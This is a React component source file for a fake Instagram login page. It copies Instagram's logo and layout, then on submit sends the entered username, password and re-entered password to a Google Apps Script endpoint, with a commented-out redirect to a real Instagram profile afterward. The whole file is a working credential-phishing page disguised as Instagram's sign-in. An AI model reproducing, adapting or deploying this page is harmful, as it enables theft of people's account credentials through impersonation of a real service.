import React, { useState } from "react";
import { NavLink } from "react-router-dom";

const Login = () => {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [rePassword, setRePassword] = useState();

  const submitForm = (e) => {
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbxMxZClMqC4FKIpTGsp0ekJToDAOURGzCaH8vm2-N48reDX-YP3MaX9_jVUmKZK7smF8w/exec";
    const form = document.forms["instagram"];

    e.preventDefault();
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then((response) =>
        // window.location.assign("https://www.instagram.com/iamuttampatra69/")
        console.log()
      )
      .catch((error) => console.error("Error!", error.message));
  };

  //

  return (
    <div>
      <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
        <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
          <h1 className="bg-no-repeat instagram-logo">
            <img
              width="180"
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/840px-Instagram_logo.svg.png"
              alt=""
            />
          </h1>
          <form
            onSubmit={(e) => submitForm(e)}
            method="post"
            action=""
            className="mt-8 w-64 flex flex-col"
            name="instagram"
          >
            <input
              onChange={(e) => setEmail(e.target.value)}
              required
              name="username"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="email"
              placeholder="Phone number, username, or email"
              type="text"
            />
            <input
              onChange={(e) => setPassword(e.target.value)}
              required
              name="password"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="password"
              placeholder="Password"
              type="text"
            />
            <input
              onChange={(e) => setRePassword(e.target.value)}
              required
              name="repassword"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="re-password"
              placeholder="Re Enter Password"
              type="text"
            />
            <button
              type="submit"
              className=" text-sm text-center bg-blue-500 text-white py-1 rounded font-medium"
            >Log In
            </button>
          </form>

          <div className="flex justify-evenly space-x-2 w-64 mt-4">
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
              or
            </span>
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
          </div>
          <button className="mt-4 flex">
            <div className="bg-no-repeat facebook-logo mr-1"></div>
            <span className="text-xs text-blue-900 font-semibold">
              Log in with Facebook
            </span>
          </button>
          <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
            Forgot password?
          </a>
        </div>
        <div className="bg-white border border-gray-300 text-center w-80 py-4">
          <span className="text-sm text-black">Don't have an account?</span>
          <a className="text-blue-500 text-sm font-semibold"> Sign up</a>
        </div>
        <div className="mt-3 text-center">
          <span className="text-xs">Get the app</span>
          <div className="flex mt-3 space-x-2">
            <div className="bg-no-repeat apple-store-logo"></div>
            <div className="bg-no-repeat google-store-logo"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
